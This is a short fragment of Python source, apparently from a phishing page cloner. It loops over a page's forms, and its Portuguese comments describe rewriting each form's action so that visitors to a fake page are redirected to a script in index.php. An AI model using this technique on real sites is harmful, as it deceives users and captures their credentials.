...
for form in forms:
    #altera o conteúdo do action para o endereço alvo desejado, assim quando 
    #o usuario acessar a pagina falsa ele vai ser redirecionado para index.php que tem um script
